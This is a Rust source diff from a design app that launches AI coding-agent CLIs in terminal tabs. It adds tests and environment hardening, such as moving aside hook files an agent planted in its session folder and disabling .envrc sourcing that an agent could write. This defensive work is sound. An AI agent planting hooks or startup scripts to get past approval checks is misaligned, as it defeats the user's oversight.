+
+    #[test]
+    fn codex_untitled_launch_does_not_register_designos_without_a_workspace() {
+        without_private_root(|| {
+            let mut st = tab_state_in(PermissionMode::Ask);
+            let idx = st.spawn_tab(AgentCliPreset::Codex, None).expect("Codex tab starts");
+            let command = st.tabs[idx].spawned_command.as_deref().expect("launch command");
+            assert!(!command.contains("mcp_servers.designos"), "untitled Codex must not register a server with an empty workspace: {command}");
+            assert!(!command.contains("--workspace"), "untitled Codex must not pass an empty workspace: {command}");
+            assert!(st.status_msg.as_deref().is_some_and(|status| status.contains("No design tools in this session")));
+            st.shutdown();
+        });
+    }
+
+    /// The decision follows the design (an untitled one with no private workspace), not a note the provisioning step has to write:
+    /// a provisioning that fails part way writes no note, and Codex must still start without a server with an empty workspace.
+    #[test]
+    fn codex_untitled_launch_registers_no_design_server_even_when_provisioning_fails() {
+        without_private_root(|| {
+            let mut st = tab_state_in(PermissionMode::Ask);
+            // A file where Gemini's settings folder belongs makes writing the session files fail.
+            crate::agent_session_files::test_support::plant(&st.session_dir, ".gemini", "not a folder");
+            let provisioned = st.provision_session_agent_files(None);
+            assert!(provisioned.is_some(), "precondition: the provisioning step fails");
+            let idx = st.spawn_tab(AgentCliPreset::Codex, None).expect("Codex tab starts");
+            let command = st.tabs[idx].spawned_command.as_deref().expect("launch command");
+            assert!(!command.contains("mcp_servers.designos"), "no server with an empty workspace: {command}");
+            assert!(!command.contains("--workspace"), "{command}");
+            st.shutdown();
+        });
+    }
+
+    /// A design with a file has a workspace of its own (its folder), so Codex keeps its design server there.
+    #[test]
+    fn codex_keeps_its_design_server_for_a_design_with_a_file() {
+        without_private_root(|| {
+            let mut st = tab_state_in(PermissionMode::Ask);
+            let folder = std::env::temp_dir().join(format!("designos-codex-titled-{}", std::process::id()));
+            std::fs::create_dir_all(&folder).expect("a folder");
+            let file = folder.join("design.designos");
+            let idx = st.spawn_tab(AgentCliPreset::Codex, Some(&file)).expect("Codex tab starts");
+            let command = st.tabs[idx].spawned_command.as_deref().expect("launch command");
+            assert!(command.contains("mcp_servers.designos.command"), "{command}");
+            st.shutdown();
+            let _ = std::fs::remove_dir_all(&folder);
+        });
+    }
+
+    #[test]
+    fn custom_cli_status_keeps_the_no_workspace_note() {
+        without_private_root(|| {
+            let mut st = tab_state_in(PermissionMode::Ask);
+            st.spawn_custom_cli_tab("Custom", "true", None).expect("custom tab starts");
+            let status = st.status_msg.as_deref().unwrap_or_default();
+            assert!(status.starts_with("Spawned Custom"), "custom status names the started CLI: {status}");
+            assert!(status.contains("No design tools in this session"), "custom status preserves workspace note: {status}");
+            st.shutdown();
+        });
+    }
+
+    /// A resumed Codex session of an untitled design starts through the same function with the `codex resume` command, and
+    /// registers no design server either.
+    #[test]
+    fn a_resumed_codex_session_of_an_untitled_design_registers_no_design_server() {
+        without_private_root(|| {
+            let mut st = tab_state_in(PermissionMode::Skip);
+            let resume = format!("codex resume --last --dangerously-bypass-approvals-and-sandbox{}", codex_mcp_overrides!());
+            let idx = st
+                .spawn_tab_with_registration(
+                    AgentCliPreset::Codex,
+                    None,
+                    Some(&resume),
+                    None,
+                    true,
+                    None,
+                    false,
+                    crate::agent_permissions::AgentPermissionMode::Skip,
+                )
+                .expect("the resumed Codex tab starts");
+            let command = st.tabs[idx].spawned_command.as_deref().expect("launch command");
+            assert_eq!(command, "codex resume --last --dangerously-bypass-approvals-and-sandbox");
+            st.shutdown();
+        });
+    }
+
+    /// Every mode with the approval hook starts Grok and Antigravity on a project config that is exactly Studio's: a hook file an
+    /// agent planted in the session folder is moved aside before the tab starts, in Ask when risky as in Ask.
+    #[test]
+    fn a_grok_tab_in_every_approval_mode_starts_on_the_exact_project_config() {
+        for mode in [crate::agent_permissions::AgentPermissionMode::Ask, crate::agent_permissions::AgentPermissionMode::AskRisky] {
+            without_private_root(|| {
+                let mut st = tab_state_in(mode);
+                crate::agent_session_files::ensure_session_dir(&st.session_dir).expect("the session folder");
+                let planted = st.session_dir.join(".grok/hooks/planted.json");
+                std::fs::create_dir_all(planted.parent().expect("a hooks folder")).expect("hooks folder");
+                std::fs::write(&planted, b"{}").expect("a planted hook file");
+
+                st.spawn_tab_with_registration(AgentCliPreset::Grok, None, Some("true"), None, false, None, false, mode).expect("the Grok tab starts");
+
+                assert!(!planted.exists(), "{mode:?}: the planted hook file was moved aside");
+                st.shutdown();
+            });
+        }
+    }
+
+    /// Only the design server's overrides go: the permission flags and a `resume` before them stay, and a command with no
+    /// override is returned as it came.
+    #[test]
+    fn stripping_the_codex_overrides_keeps_the_prefix_and_leaves_other_commands_alone() {
+        for (mode, prefix) in [(PermissionMode::Ask, "codex"), (PermissionMode::Skip, "codex --dangerously-bypass-approvals-and-sandbox")] {
+            let launch = AgentCliPreset::Codex.cli_launch_command_for_mode(mode);
+            assert!(launch.contains("mcp_servers.designos"), "precondition: the launch command registers the server: {launch}");
+            assert_eq!(super::strip_codex_mcp_overrides(launch), prefix, "{mode:?}");
+        }
+        let resume = format!("codex resume --last --dangerously-bypass-approvals-and-sandbox{}", codex_mcp_overrides!());
+        assert_eq!(super::strip_codex_mcp_overrides(&resume), "codex resume --last --dangerously-bypass-approvals-and-sandbox");
+        assert_eq!(super::strip_codex_mcp_overrides("claude --resume abc"), "claude --resume abc");
+    }
+
+    /// The writer thread reports a failed write as "Couldn't update the agent files" and retries it; a missing workspace is not one.
+    #[test]
+    fn a_missing_workspace_is_not_a_failed_write_of_the_agent_files() {
+        without_private_root(|| {
+            let st = tab_state_in(PermissionMode::Ask);
+            let job = st.provisioning_job(None, None);
+            write_session_agent_files_for_job(&job).expect("every file is written, so the sync is not marked failed");
+            assert!(names_designos_server(&st.session_dir, "mcp-config.json") == Some(false));
+        });
+    }
 }
 
 /// Working directory of a spawned tab, never `/` (an app opened from Finder has no useful cwd).
 /// Agent CLIs start in the per-file session dir because that is where they discover the project
 /// config, skills and `AGENTS.md` Studio provisions; a shell tab opens in the file's folder.
-fn resolve_pty_cwd(preset: AgentCliPreset, session_dir: Option<&Path>, workspace: PathBuf) -> PathBuf {
+fn resolve_pty_cwd(preset: AgentCliPreset, session_dir: Option<&Path>, workspace: Option<PathBuf>) -> PathBuf {
     let is_agent = !matches!(preset, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp);
-    match session_dir {
-        Some(dir) if is_agent => dir.to_path_buf(),
-        _ if workspace.parent().is_some() => workspace,
-        Some(dir) => dir.to_path_buf(),
-        None => std::env::temp_dir(),
+    match (session_dir, workspace) {
+        (Some(dir), _) if is_agent => dir.to_path_buf(),
+        (_, Some(workspace)) if workspace.parent().is_some() => workspace,
+        (Some(dir), _) => dir.to_path_buf(),
+        (None, _) => std::env::temp_dir(),
     }
 }
 
@@ -4818,53 +6261,72 @@ pub fn configure_pty_env(cmd: &mut CommandBuilder, preset: AgentCliPreset, file_
 /// `DESIGNOS_MCP_CONFIG`, `DESIGNOS_LIVE_SPEC`, `DESIGNOS_LIVE_DOC_SYNC`, `DESIGNOS_LIVE_CANVAS`, `DESIGNOS_CONTEXT_JSON`,
 /// `DESIGNOS_SELECTION_JSON`, `DESIGNOS_TARGET_PAGE_ID`, `DESIGNOS_TARGET_PAGE_NAME`, `DESIGNOS_DOC_NAME`).
 pub fn configure_pty_env_with_session(cmd: &mut CommandBuilder, preset: AgentCliPreset, file_path: Option<&Path>, session: Option<&SessionEnv>) {
+    configure_pty_env_with_session_and_hermetic(cmd, preset, file_path, session, crate::cli_resolve::hermetic_agent_cli_dir().as_deref());
+}
+
+pub fn configure_pty_env_with_session_and_hermetic(
+    cmd: &mut CommandBuilder,
+    preset: AgentCliPreset,
+    file_path: Option<&Path>,
+    session: Option<&SessionEnv>,
+    hermetic_dir: Option<&Path>,
+) {
     cmd.env("TERM", "xterm-256color");
     cmd.env("COLORTERM", "truecolor");
-    cmd.env("DESIGNOS_AGENT_RUNTIME", preset.binary_name());
-    cmd.env("DESIGNOS_IN_PROGRESS_STALE_MINUTES", designos_doc::in_progress_stale_minutes().to_string());
     if preset == AgentCliPreset::Grok {
         // Grok starts repo-local MCP servers, hooks and skills only in a trusted folder. The tab's
         // cwd is Studio's own session dir, so skip the prompt for this process instead of writing
         // `~/.grok/trusted_folders.toml`.
         cmd.env("GROK_FOLDER_TRUST", "0");
+        // With the trust prompt off, Grok also sources `<cwd>/.envrc` with bash when a session starts. A zero turns every `.envrc`
+        // evaluation off, in Ask and Skip mode alike: a session folder never holds an `.envrc` the user wrote, and an agent may.
+        cmd.env("GROK_ENVRC_TIMEOUT_SECS", "0");
     }
-
+    // The Ask launch names these three variables, and Claude reads an empty `--settings` as no settings and an empty
+    // `--plugin-dir` as its own working folder. So an Ask tab always gets non-empty values (a private file or plugin, or
+    // values that name nothing). A tab without a session takes the Ask command as its safety net, so it gets the values
+    // that name nothing. A Skip tab names none of the variables, and a value Studio's own environment held must not reach it.
+    let (mcp_config, settings, plugin) = match session {
+        Some(sess) => (sess.claude_mcp_config.as_deref(), sess.claude_settings.as_deref(), sess.claude_plugin.as_deref()),
+        None => (
+            Some(crate::agent_permissions::NO_CLAUDE_MCP_CONFIG),
+            Some(crate::agent_permissions::NO_CLAUDE_SETTINGS),
+            Some(crate::agent_permissions::NO_CLAUDE_PLUGIN_DIR),
+        ),
+    };
+    for (name, value) in [
+        (crate::agent_permissions::CLAUDE_MCP_CONFIG_ENV, mcp_config),
+        (crate::agent_permissions::CLAUDE_SETTINGS_ENV, settings),
+        (crate::agent_permissions::CLAUDE_PLUGIN_ENV, plugin),
+    ] {
+        match value {
+            Some(value) => cmd.env(name, value),
+            None => cmd.env_remove(name),
+        }
+    }
     if let Some(sess) = session {
-        cmd.env("DESIGNOS_SESSION_DIR", sess.session_dir.as_os_str());
-        cmd.env("DESIGNOS_AGENT_RUN_ID", &sess.run_id);
-        cmd.env("DESIGNOS_MCP_CONFIG", sess.mcp_config_path.as_os_str());
-        cmd.env("DESIGNOS_LIVE_SPEC", sess.live_spec_path.as_os_str());
-        cmd.env("DESIGNOS_LIVE_DOC_SYNC", sess.live_doc_sync_path.as_os_str());
-        cmd.env("DESIGNOS_LIVE_DOC_PATCH", sess.session_dir.join("doc-patch.jsonl").as_os_str());
-        cmd.env("DESIGNOS_LIVE_CANVAS", sess.live_canvas_path.as_os_str());
-        cmd.env("DESIGNOS_CONTEXT_JSON", sess.context_json_path.as_os_str());
-        cmd.env("DESIGNOS_SELECTION_JSON", sess.selection_spec_path.as_os_str());
-        cmd.env("DESIGNOS_TARGET_PAGE_ID", sess.current_page_id.to_string());
-        cmd.env("DESIGNOS_TARGET_PAGE_NAME", &sess.current_page_name);
-        cmd.env("DESIGNOS_DOC_NAME", &sess.doc_name);
         if preset == AgentCliPreset::Gemini {
             cmd.env("GEMINI_CLI_TRUSTED_FOLDERS_PATH", sess.session_dir.join(".gemini").join("trustedFolders.json").as_os_str());
+            // The variable is Gemini's own, so a value the user or an admin set stays when Studio has no file to name.
+            if let Some(defaults) = sess.gemini_system_defaults.as_deref() {
+                cmd.env(crate::gemini_status_hooks::SYSTEM_DEFAULTS_ENV, defaults);
+            }
         }
-        if let Some(tab_uuid) = sess.tab_session_uuid.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
-            cmd.env("DESIGNOS_TAB_SESSION_UUID", tab_uuid);
-        }
-    } else {
-        cmd.env("DESIGNOS_AGENT_RUN_ID", format!("p{}-tab-1-1-1", std::process::id()));
-        let fallback_dir = std::env::temp_dir().join("designos-sessions").join(tab_session_id(&format!("p{}", std::process::id()), 1));
-        cmd.env("DESIGNOS_LIVE_SPEC", fallback_dir.join("live-spec.json").as_os_str());
-        cmd.env("DESIGNOS_SELECTION_JSON", fallback_dir.join("selection.spec.json").as_os_str());
+    }
+    for (k, v) in tab_designos_env_map(preset, file_path, session) {
+        cmd.env(k, v);
+    }
+    if cmd.get_cwd().is_none() {
+        cmd.cwd(resolve_pty_cwd(preset, session.map(|sess| sess.session_dir.as_path()), session_workspace_dir(file_path).ok()));
     }
 
-    if let Ok(exe) = std::env::current_exe() {
-        cmd.env("DESIGNOS_BIN", exe.as_os_str());
-    }
-    cmd.env("DESIGNOS_MCP_BIN", designos_mcp_binary().as_os_str());
-    if let Some(fp) = file_path {
-        cmd.env("DESIGNOS_FILE", fp.as_os_str());
-    }
-    cmd.env("DESIGNOS_WORKSPACE", session_workspace_dir(file_path).as_os_str());
-    if cmd.get_cwd().is_none() {
-        cmd.cwd(resolve_pty_cwd(preset, session.map(|sess| sess.session_dir.as_path()), session_workspace_dir(file_path)));
+    if let Some(dir) = hermetic_dir {
+        let sep = if cfg!(windows) { ";" } else { ":" };
+        let hermetic_path = format!("{}{sep}/usr/bin{sep}/bin", dir.display());
+        cmd.env("PATH", hermetic_path);
+        cmd.env_remove("BASH_ENV");
+        cmd.env_remove("ENV");
+        return;
     }
 
     #[cfg(test)]
@@ -4872,7 +6334,16 @@ pub fn configure_pty_env_with_session(cmd: &mut CommandBuilder, preset: AgentCli
         cmd.env("PATH", overrides);
         return;
     }
-    if std::env::var_os("PATH").is_some_and(|p| p.is_empty()) {
+    // A test's agent tab finds no real agent CLI: it gets the stubs the test put in `path_prepend`, then the test process's own `PATH`
+    // without any folder that holds an agent CLI (the user's `~/.local/bin`, Homebrew's, and so on). The runner's own tools, a stub's
+    // `python3` and `sh`, stay where the runner has them.
+    #[cfg(test)]
+    if !matches!(preset, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp) {
+        let prepend = session.map(|s| s.path_prepend.as_slice()).unwrap_or_default();
+        cmd.env("PATH", crate::test_agent_path::test_agent_path(prepend, crate::cli_resolve::host_path_os()));
+        return;
+    }
+    if crate::cli_resolve::host_path_is_empty() {
         cmd.env("PATH", "");
         return;
     }
@@ -4885,7 +6356,7 @@ pub fn configure_pty_env_with_session(cmd: &mut CommandBuilder, preset: AgentCli
     }
     extra_paths.extend(extra_cli_path_dirs().into_iter().map(|p| p.to_string_lossy().into_owned()));
 
-    let current_path = std::env::var("PATH").unwrap_or_default();
+    let current_path = crate::cli_resolve::host_path_raw();
     let sep = if cfg!(windows) { ";" } else { ":" };
     let combined = if current_path.is_empty() { extra_paths.join(sep) } else { format!("{}{sep}{current_path}", extra_paths.join(sep)) };
     cmd.env("PATH", combined);
@@ -4944,7 +6415,8 @@ pub fn export_selection_and_comments_to_pty(
         );
     }
     let json = serde_json::to_string_pretty(&json_value).map_err(|e| e.to_string())?;
-    atomic_write_session_file(&state.selection_spec_path, json.as_bytes()).map_err(|e| format!("write {}: {e}", state.selection_spec_path.display()))?;
+    atomic_write_session_file(&state.selection_spec_path, json.as_bytes())
+        .map_err(|e| format!("write {}: {}", state.selection_spec_path.display(), crate::agent_session_files::with_next_step(&e)))?;
 
     let cmd_snippet =
         format!("Read the design:os selection at {} (node spec plus open pin-comments under \"designos_context\").", state.selection_spec_path.display());
@@ -5034,6 +6506,12 @@ pub fn show_left_with_selection(
 /// gap and padding editor are not marked either; they open from a press on the canvas, which takes the keyboard from the
 /// terminal.
 pub fn overlay_owns_keyboard(app: &crate::app::App, ctx: &egui::Context) -> bool {
+    modal_owns_keyboard(app) || crate::widgets::popup_open::open_recently(ctx)
+}
+
+/// The part of [`overlay_owns_keyboard`] that is not a marked popup: a dialog, modal, palette or menu that is open by a flag.
+/// The panel's own menus mark themselves open, so the mark cannot tell them from another overlay; this can.
+pub fn modal_owns_keyboard(app: &crate::app::App) -> bool {
     app.dialog.is_some()
         || app.history.save_modal.is_some()
         || app.dev.compare.is_some()
@@ -5044,7 +6522,6 @@ pub fn overlay_owns_keyboard(app: &crate::app::App, ctx: &egui::Context) -> bool
         || app.ui.layer_picker.is_some()
         || app.libs.open
         || app.libs.review
-        || crate::widgets::popup_open::open_recently(ctx)
 }
 
 /// Renders the `Agents` Left Side Panel with live [`Document`] access for the `@`-mention picker (`#655`).
@@ -5057,6 +6534,9 @@ pub fn show_left_with_doc(
     doc: &Document,
     current_page: NodeId,
 ) -> Vec<TerminalAction> {
+    if state.composer_selection != *selection_summary {
+        state.composer_selection = selection_summary.clone();
+    }
     state.poll_pending_online_retries(file_path);
     let mut actions = state.poll_live_agent_bridge();
     crate::agent_a11y::label_agents_panel(state, ui);
@@ -5068,15 +6548,16 @@ pub fn show_left_with_doc(
     }
 
     if state.side_panel_pty_open {
-        // Pure Interactive PTY Shell by Default + Top `+` Runtime Dropdown (`DIR-29`)
+        // The panel fill; tests find the terminal area by this rect, not by a fill colour the window shares.
         p.rect_filled(rect, 0.0, TERM_BG_VIEWPORT);
+        #[cfg(test)]
+        ui.ctx().data_mut(|d| d.insert_temp(Id::new(("test-rect", "agents-terminal-rect".to_string())), rect));
 
-        let bar_h = 36.0;
         if ui.input(|i| i.pointer.any_pressed()) {
             if let Some(pos) = ui.input(|i| i.pointer.interact_pos()) {
                 if rect.contains(pos) {
-                    // A press in the header or the strip under it is panel chrome: `Esc` stops the turn there, and is forwarded to the CLI in the terminal (`#684 §3.1`).
-                    let in_chrome = pos.y < rect.top() + bar_h + theme::CONTROL_DENSE;
+                    // A press in the header is panel chrome: Esc stops the turn there, and is forwarded to the CLI in the terminal.
+                    let in_chrome = pos.y < rect.top() + TERMINAL_HEADER_H;
                     state.chrome_focused = in_chrome;
                     state.viewport_focused = !in_chrome;
                 } else {
@@ -5085,265 +6566,32 @@ pub fn show_left_with_doc(
             }
         }
 
-        let bar_r = Rect::from_min_size(rect.min, Vec2::new(rect.width(), bar_h));
-        p.rect_filled(bar_r, 0.0, TERM_BG_BAR);
-        widgets::hline(&p, bar_r.left(), bar_r.right(), bar_r.bottom() - 1.0, TERM_BORDER);
+        let bar_r = crate::agent_header::paint(state, ui, rect);
 
-        let stop_left = crate::agent_stop::paint_header_stop_controls(ui, &p, state, bar_r, bar_r.right());
-
-        // The `Skills` button (`RD-4` §7) sits right of the `+` runtime selector: the tabs, `Sessions` and `+` end before it.
-        let skills_w = state.skills.chip_width(&p);
-        let controls_left = stop_left - skills_w - theme::SPACE_INLINE;
-
-        // Left-aligned session tabs + `"Sessions"` ghost button + `+` runtime dropdown button
-        let max_tabs_right = crate::agent_open_flow::max_tabs_right_for_bar(controls_left);
-        let mut x = bar_r.left() + 6.0;
-        let mut tab_to_select: Option<usize> = None;
-        let mut tab_to_close: Option<usize> = None;
-        let can_close = !state.tabs.is_empty();
-
-        for (idx, tab) in state.tabs.iter().enumerate() {
-            let tab_w = if state.tabs.len() <= 1 {
-                // Grows from 104 px to fit the whole title (`Claude Code #1`), within the room the controls leave.
-                let title_w = widgets::text_width(&p, &tab.title, &theme::font_caption_medium()) + 40.0;
-                104.0f32.max(title_w).min((max_tabs_right - x).max(64.0))
-            } else {
-                82.0f32.min(((max_tabs_right - x) / (state.tabs.len() as f32)).max(56.0))
-            };
-            if x + 48.0 > max_tabs_right {
-                break;
-            }
-            let is_active = idx == state.active_tab;
-            let t_rect = Rect::from_min_size(Pos2::new(x, bar_r.center().y - 12.0), Vec2::new(tab_w, 24.0));
-            let close_rect = Rect::from_min_size(Pos2::new(t_rect.right() - 16.0, t_rect.center().y - 6.0), Vec2::splat(12.0));
-            let t_hit_rect =
-                if can_close { Rect::from_min_max(t_rect.min, Pos2::new((close_rect.left() - 2.0).max(t_rect.left() + 16.0), t_rect.max.y)) } else { t_rect };
-            let tab_waiting = tab.needs_approval() || (is_active && !state.pending_approvals.is_empty());
-            let tab_resp = ui.interact(t_hit_rect, Id::new(("agents-left-tab-select", tab.id)), Sense::click());
-            let tab_tip = match (tab_waiting, tab.usage_tooltip_text()) {
-                (true, Some(usage)) => Some(format!("{NEEDS_APPROVAL_LABEL}\n{usage}")),
-                (true, None) => Some(NEEDS_APPROVAL_LABEL.to_string()),
-                (false, usage) => usage,
-            };
-            // The strip keeps an exited tab's width. It shows a hollow status ring and a title that is one step dimmer
-            // than an active tab's but still readable; the tooltip says it exited.
-            let tab_tip = match (tab.exited_notice_shown, tab_tip) {
-                (true, Some(tip)) => Some(format!("{}\n{tip}", tab.display_title())),
-                (true, None) => Some(tab.display_title()),
-                (false, tip) => tip,
-            };
-            let tab_resp = if let Some(tip) = tab_tip { tab_resp.on_hover_text(tip) } else { tab_resp };
-            let close_resp = if can_close { Some(ui.interact(close_rect, Id::new(("agents-left-tab-close", tab.id)), Sense::click())) } else { None };
-
-            let bg = if is_active {
-                TERM_BG_ELEVATED
-            } else if tab_resp.hovered() {
-                TERM_BG_HOVER
-            } else {
-                TERM_BG_BAR
-            };
-            p.rect_filled(t_rect, theme::cr(theme::RADIUS_CONTROL), bg);
-            if is_active {
-                p.rect_stroke(t_rect, theme::cr(theme::RADIUS_CONTROL), Stroke::new(1.0, TERM_BORDER), StrokeKind::Inside);
-                p.rect_filled(
-                    Rect::from_min_max(Pos2::new(t_rect.left() + 4.0, t_rect.bottom() - 2.0), Pos2::new(t_rect.right() - 4.0, t_rect.bottom())),
-                    CornerRadius::same(1),
-                    TERM_ORANGE,
-                );
-            }
-            paint_orca_tab_status_and_provider(ui, &p, tab, t_rect);
-            let text_pad_r = if can_close { 34.0 } else { 23.0 };
-            let title_str = widgets::elide(&p, &tab.title, &theme::font_caption_medium(), (tab_w - text_pad_r).max(16.0));
-            p.text(
-                Pos2::new(t_rect.left() + 21.0, t_rect.center().y),
-                Align2::LEFT_CENTER,
-                title_str,
-                theme::font_caption_medium(),
-                if is_active && !tab.exited_notice_shown { theme::TEXT } else { theme::TEXT_SECONDARY },
-            );
-            if let Some(cr) = &close_resp {
-                icons::paint(&p, Icon::Close, close_rect.center(), 9.0, if cr.hovered() { STATUS_BAD_TEXT } else { theme::ICON_TERTIARY });
-                if cr.clicked() {
-                    tab_to_close = Some(idx);
-                }
-            }
-            if tab_to_close.is_none() && tab_resp.clicked() {
-                tab_to_select = Some(idx);
-            }
-            x = t_rect.right() + 4.0;
-        }
-
-        if let Some(idx) = tab_to_select {
-            state.active_tab = idx;
-            if let Some(tab) = state.tabs.get_mut(idx) {
-                tab.unread = false;
-            }
-            state.sync_active_tab_approvals();
-            state.viewport_focused = true;
-            state.runtime_dropdown_open = false;
-            state.sessions_popover_open = false;
-            state.picker.on_close();
-            state.sessions_popover_open = false;
-            state.refresh_tab_usage(idx);
-        }
         if state.surface_visible {
             if let Some(tab) = state.active_tab_mut() {
                 tab.unread = false;
             }
         }
-        if let Some(idx) = tab_to_close {
-            state.close_tab(idx);
-        }
 
-        // `"Sessions"` ghost button (`#651` §3 rule 5 & §7) + top `+` button (`agents-runtime-add-btn`)
-        let add_x = crate::agent_open_flow::render_sessions_button_in_bar(state, ui, bar_r, x, controls_left);
-        let add_rect = Rect::from_min_size(Pos2::new(add_x, bar_r.center().y - 12.0), Vec2::new(28.0, 24.0));
-        let add_resp = ui.interact(add_rect, Id::new("agents-runtime-add-btn"), Sense::click());
-        let add_bg = if state.runtime_dropdown_open {
-            STATUS_INFO_BG
-        } else if add_resp.hovered() {
-            TERM_BG_HOVER
-        } else {
-            TERM_BG_ELEVATED
-        };
-        let add_border = if state.runtime_dropdown_open { STATUS_INFO_BORDER } else { TERM_BORDER };
-        let add_fg = if state.runtime_dropdown_open { STATUS_INFO_TEXT } else { Color32::WHITE };
-        p.rect_filled(add_rect, theme::cr(theme::RADIUS_CONTROL), add_bg);
-        p.rect_stroke(add_rect, theme::cr(theme::RADIUS_CONTROL), Stroke::new(1.0, add_border), StrokeKind::Inside);
-        icons::paint(&p, Icon::Plus, Pos2::new(add_rect.left() + 10.0, add_rect.center().y), 11.0, add_fg);
-        icons::paint(&p, Icon::ChevronDown, Pos2::new(add_rect.right() - 7.0, add_rect.center().y), 8.0, add_fg);
-        widgets::record(ui, "agents-runtime-add-btn", add_rect);
-        // The menu below reads these two, not the test hook: a press on `+` is not a press outside the menu, and the
-        // press of the click that opens the menu must not close it in the pass that opens it.
-        ui.ctx().data_mut(|d| d.insert_temp(Id::new("agents-runtime-add-btn-rect"), add_rect));
-        if add_resp.clicked() {
-            state.runtime_dropdown_open = !state.runtime_dropdown_open;
-            state.resume_notice = None;
-            if state.runtime_dropdown_open {
-                state.sessions_popover_open = false;
-                let pass_nr = ui.ctx().cumulative_pass_nr();
-                ui.ctx().data_mut(|d| d.insert_temp(Id::new("agents-runtime-opened-pass"), pass_nr));
-            } else {
-                state.picker.on_close();
-            }
-        }
-
-        // `Skills` button, `CONTROL_STANDARD` (28 px) high: opens the picker of skills attached to an agent's runs, like the composer chip.
-        let skills_r = Rect::from_min_size(
-            Pos2::new(add_rect.right() + theme::SPACE_INLINE, bar_r.center().y - theme::CONTROL_STANDARD * 0.5),
-            Vec2::new(skills_w, theme::CONTROL_STANDARD),
-        );
-        state.skills.paint_chip(ui, &p, skills_r, "agents-header-skills");
-
-        // Header strip (`CONTROL_DENSE` = 24px): the live selection chip (#654) stays on the left; the live turn status (`#683` §7,
-        // running dot + text) and the active tab's verified token/cost readout (`#678` §7) sit right of it, left of `@ Mention`.
-        // The chip shrinks to the space left of them; the usage readout is dropped when the chip would get too narrow.
-        let ctx_h = theme::CONTROL_DENSE;
-        let ctx_r = Rect::from_min_size(Pos2::new(rect.left(), bar_r.bottom()), Vec2::new(rect.width(), ctx_h));
-        p.rect_filled(ctx_r, 0.0, theme::BG_PRIMARY);
-        widgets::hline(&p, ctx_r.left(), ctx_r.right(), ctx_r.bottom() - theme::BORDER_WIDTH, theme::BORDER);
-        let now_secs = crate::agent_sessions::unix_timestamp_secs();
-        let strip_left = ctx_r.left() + theme::INSET_CONTROL;
-        let (mention_btn_r, mention_clicked) = crate::agent_mention_popup::paint_terminal_mention_button(
-            ui,
-            "agent-mention-btn-left",
-            ctx_r.right() - theme::INSET_CONTROL,
-            ctx_r,
-            state.mention_popup.is_open_for_surface("agents-left-pty"),
-        );
-        if mention_clicked {
-            state.mention_popup.toggle_terminal_mode_for("agents-left-pty", doc, current_page);
-        }
-        let strip_right = (mention_btn_r.left() - theme::SPACE_INLINE).max(strip_left + theme::TARGET_MIN);
-        let mut chip_right = strip_right;
-        // One right-hand slot: a pending approval (`#656`) takes it over from the live turn status (`#683`).
-        let needs_approval = state.needs_approval();
-        let strip_status = if needs_approval {
-            Some((STATUS_WARN_TEXT, NEEDS_APPROVAL_LABEL.to_string()))
-        } else if let Some(notice) = state.active_tab().and_then(|t| t.still_running_notice.clone()) {
-            // The CLI ignored both interrupt keys (`#684 §8.1`).
-            Some((STATUS_WARN_TEXT, notice))
-        } else {
-            state.active_tab().and_then(|t| t.header_status_indicator(now_secs))
-        };
-        const DOT_DIAMETER: f32 = 6.0;
-        let text_x_off = DOT_DIAMETER + theme::INSET_CONTROL;
-        let status_font = theme::font_caption();
-        let status_w = strip_status.as_ref().map(|(_, status_txt)| {
-            let cap_w = (((ctx_r.right() - theme::INSET_CONTROL) - strip_left) * 0.4).max(text_x_off + theme::TARGET_MIN).min(strip_right - strip_left);
-            (text_x_off + widgets::text_width(&p, status_txt, &status_font)).min(cap_w)
-        });
-        // The active tab's usage readout (`#678`) takes the slot next to `@ Mention`. It yields to the chip and the turn status:
-        // when the room left would be too small to read, only the tab tooltip carries the numbers.
-        let mut status_right = strip_right;
-        let mut usage_drawn = false;
-        if let Some(usage_caption) = state.active_tab().and_then(|t| t.header_usage_caption()) {
-            let status_take = status_w.map_or(0.0, |w| w + theme::INSET_CONTROL);
-            let usage_room = strip_right - strip_left - STRIP_CHIP_MIN_W - status_take;
-            if usage_room >= STRIP_USAGE_MIN_W {
-                let mono = theme::font_mono();
-                let usage_text = widgets::elide(&p, &usage_caption, &mono, usage_room);
-                let usage_w = widgets::text_width(&p, &usage_text, &mono);
-                let usage_r = Rect::from_min_max(Pos2::new(strip_right - usage_w, ctx_r.top()), Pos2::new(strip_right, ctx_r.bottom()));
-                p.text(Pos2::new(usage_r.right(), usage_r.center().y), Align2::RIGHT_CENTER, usage_text, mono, theme::TEXT_SECONDARY);
-                let usage_resp = ui.interact(usage_r, Id::new("agents-header-usage"), Sense::hover());
-                if let Some(tip) = state.active_tab().and_then(|t| t.usage_tooltip_text()) {
-                    let _ = usage_resp.on_hover_text(tip);
-                }
-                widgets::record(ui, "agents-header-usage", usage_r);
-                status_right = usage_r.left() - theme::INSET_CONTROL;
-                usage_drawn = true;
-            }
-        }
-        if !usage_drawn {
-            ui.ctx().data_mut(|d| d.remove::<Rect>(Id::new(("test-rect", "agents-header-usage".to_string()))));
-        }
-        if let (Some((dot_col, status_txt)), Some(status_w)) = (strip_status, status_w) {
-            let status_r = Rect::from_min_max(Pos2::new(status_right - status_w, ctx_r.top()), Pos2::new(status_right, ctx_r.bottom()));
-            let status_elided = widgets::elide(&p, &status_txt, &status_font, (status_w - text_x_off).max(0.0));
-            p.circle_filled(Pos2::new(status_r.left() + DOT_DIAMETER * 0.5, status_r.center().y), DOT_DIAMETER * 0.5, dot_col);
-            let text_col = if needs_approval { STATUS_WARN_TEXT } else { theme::TEXT_SECONDARY };
-            p.text(Pos2::new(status_r.left() + text_x_off, status_r.center().y), Align2::LEFT_CENTER, status_elided, status_font, text_col);
-            widgets::record(ui, if needs_approval { "agents-needs-approval-pill" } else { "agents-header-turn-status" }, status_r);
-            chip_right = (status_r.left() - theme::INSET_CONTROL).max(strip_left + theme::TARGET_MIN);
-        } else if usage_drawn {
-            chip_right = (status_right).max(strip_left + theme::TARGET_MIN);
-        }
-        let chip_bounds = Rect::from_min_max(Pos2::new(strip_left, ctx_r.top()), Pos2::new(chip_right, ctx_r.bottom()));
-        if let Some((_chip_rect, true)) =
-            crate::agent_selection_chip::paint_selection_chip(ui, "agent-selection-chip-left", selection_summary, chip_bounds, false)
-        {
-            actions.push(TerminalAction::SendSelectionToAgent);
-        }
-
-        // Terminal-header `@`-mention picker keys are consumed before the composer and the VT100 viewport read them (`#655`).
